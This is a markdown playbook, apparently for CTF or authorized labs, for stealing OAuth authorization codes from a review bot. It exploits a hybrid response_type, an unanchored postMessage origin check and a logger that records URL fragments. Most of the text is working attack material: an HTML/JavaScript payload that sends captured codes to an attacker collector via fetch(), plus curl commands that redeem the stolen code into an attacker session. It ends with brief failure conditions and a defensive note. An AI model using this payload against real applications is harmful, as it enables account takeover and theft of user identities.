# OAuth Hybrid code token Logger Exfil Review Bot Payload

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a reviewer/admin bot has an active OAuth IdP session
- the app exposes `/logger` or similar cross-window storage via `postMessage`
- origin validation uses a suffix/prefix regex without `$`
- `/error` or similar pages log `window.location.href` including URL fragments
- authorization codes in the hash are visible to logger exfil but normal `callback#` exchange fails
- attacker can pre-create an app session and reuse its OAuth `state`

## Prerequisites

1. Attacker session:

```bash
curl -sS -c /tmp/sl.cookies 'https://[app]/' | rg -o 'state=[a-f0-9]+'
```

Save both `connect.sid` and `state`.

2. Host exploit on a suffix-bypass origin, e.g.:

```text
https://[app-host].attacker-controlled.tld/
```

## Minimal HTML Payload

```html
<!doctype html>
<meta charset=utf-8>
<script>
const Sa = '[ATTACKER_STATE]';
const SL = 'https://[app-host]';
const G = 'https://[idp-host]';
const OAST = 'https://[collector]/x';

window.addEventListener('message', e => {
  if (!e.data || e.data.type !== 'loggerData' || !e.data.data) return;
  fetch(OAST + '?d=' + encodeURIComponent(e.data.data));
  try {
    const href = JSON.parse(e.data.data).data || '';
    const m = href.match(/code=([^&]+)/);
    if (m) fetch(OAST + '?code=' + encodeURIComponent(m[1]));
  } catch (err) {}
});

const oauth = G + '/o/oauth2/v2/auth?client_id=[CLIENT_ID]'
  + '&redirect_uri=' + encodeURIComponent(SL + '/callback')
  + '&response_type=code+token&scope=openid%20email%20profile&prompt=none&state=' + Sa;

window.open(oauth, 'oauth');
setTimeout(() => {
  const lg = window.open(SL + '/logger', 'logger');
  setInterval(() => { try { lg.postMessage({ type: 'get' }, '*'); } catch (e) {} }, 500);
}, 8000);
</script>
```

Report the hosted URL through the lab's review endpoint.

## Attacker-Side Exchange

After collector receives `code`:

```bash
curl -sS -b /tmp/sl.cookies \
  "https://[app-host]/callback?code=[STOLEN_CODE]&state=[ATTACKER_STATE]" -L

curl -sS -b /tmp/sl.cookies 'https://[app-host]/profile' | rg 'pwnbox\\{|flag-value'
```

## Why It Works

- Hybrid OAuth keeps the code in the fragment for logger exfil.
- The code is still issued for `/callback`, so backend exchange succeeds.
- Attacker-controlled `state` matches the pre-seeded session.
- Bot-only Google session supplies the privileged identity via `prompt=none`.

## Why It Fails

- Backend disables hybrid/implicit response types
- logger origin checks are exact and anchored
- error pages stop logging full hrefs or strip fragments
- state is one-time and cannot be attacker-preshot
- code is consumed before attacker exchange (successful query-path exchange in bot context)
- IdP session is absent, so `prompt=none` returns the wrong identity

## Common Mistakes

- Using `redirect_uri=/callback#` and expecting normal exchange to work
- Using `response_type=code` only; query-path codes are not copied into logger
- Forgetting to save attacker `connect.sid` before reporting to the bot
- Rotating `/` and invalidating the embedded `state`
- Storing live collector URLs, cookies, or flags in reusable payload files

## Defensive Note

Treat hybrid OAuth responses, fragment-bearing callback URLs, and cross-window loggers as part of the OAuth trust boundary.
